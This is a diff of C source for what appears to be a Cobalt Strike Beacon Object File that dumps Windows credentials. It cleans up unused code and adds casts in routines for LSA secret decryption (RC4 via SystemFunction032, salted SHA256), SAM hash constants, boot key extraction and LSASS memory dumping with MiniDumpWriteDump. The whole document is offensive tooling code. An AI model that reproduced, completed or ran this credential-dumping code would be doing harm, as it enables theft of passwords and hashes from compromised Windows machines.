@@ -185,19 +185,6 @@ done:
     return ok;
 }
 
-static BOOL _sha256(const unsigned char *data, int dataLen, unsigned char *hash32) {
-    PVOID hAlg = NULL, hHash = NULL;
-    BOOL ok = FALSE;
-    if (BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, L"SHA256", NULL, 0) != 0) return FALSE;
-    if (BCRYPT$BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) != 0) goto done;
-    if (BCRYPT$BCryptHashData(hHash, (PUCHAR)data, dataLen, 0) != 0) goto done;
-    if (BCRYPT$BCryptFinishHash(hHash, hash32, 32, 0) == 0) ok = TRUE;
-done:
-    if (hHash) BCRYPT$BCryptDestroyHash(hHash);
-    if (hAlg) BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
-    return ok;
-}
-
 /* SHA256( key || salt repeated 1000x ) — used by LSA decryption */
 static BOOL _sha256_salted(const unsigned char *key, int keyLen,
                             const unsigned char *salt, int saltLen,
@@ -226,7 +213,7 @@ static BOOL _rc4(unsigned char *data, int dataLen,
     HMODULE hAdv = KERNEL32$GetModuleHandleA("advapi32.dll");
     if (!hAdv) hAdv = KERNEL32$LoadLibraryA("advapi32.dll");
     if (!hAdv) return FALSE;
-    pSystemFunction032 fn = (pSystemFunction032)KERNEL32$GetProcAddress(hAdv, "SystemFunction032");
+    pSystemFunction032 fn = (pSystemFunction032)(void *)KERNEL32$GetProcAddress(hAdv, "SystemFunction032");
     if (!fn) return FALSE;
     USTRING d = { (ULONG)dataLen, (ULONG)dataLen, data };
     USTRING k = { (ULONG)keyLen,  (ULONG)keyLen,  (PUCHAR)key };
@@ -325,8 +312,6 @@ static DWORD _find_system_pid(void) {
     while (1) {
         DWORD nextOff = *(DWORD *)ptr;
         /* UNICODE_STRING ImageName at offset 0x38 (x64) */
-        USHORT nameLen = *(USHORT *)(ptr + 0x38);
-        PWSTR  nameBuf = *(PWSTR *)(ptr + 0x38 + sizeof(USHORT) + sizeof(USHORT) + sizeof(ULONG));
         /* Some Windows versions: offset to buffer pointer differs. Use portable approach. */
         UNICODE_STRING *imgName = (UNICODE_STRING *)(ptr + 0x38);
         if (imgName->Length > 0 && imgName->Buffer) {
@@ -447,7 +432,6 @@ static BOOL _get_boot_key(unsigned char *bootKey) {
  * ═══════════════════════════════════════════════════════════════════ */
 
 static const unsigned char SAM_QWERTY[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0";
-static const unsigned char SAM_NUMERIC[] = "0123456789012345678901234567890123456789\0";
 static const unsigned char SAM_AQWERTY[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
 static const unsigned char SAM_ANUM[] = "0123456789012345678901234567890123456789";
 
@@ -1335,7 +1319,7 @@ static void _dump_lsass(void) {
         return;
     }
 
-    pMiniDumpWriteDump fnMiniDump = (pMiniDumpWriteDump)
+    pMiniDumpWriteDump fnMiniDump = (pMiniDumpWriteDump)(void *)
         KERNEL32$GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
     if (!fnMiniDump) {
         BeaconPrintf(CALLBACK_ERROR, "[!] LSASS: MiniDumpWriteDump not found in dbghelp.dll");
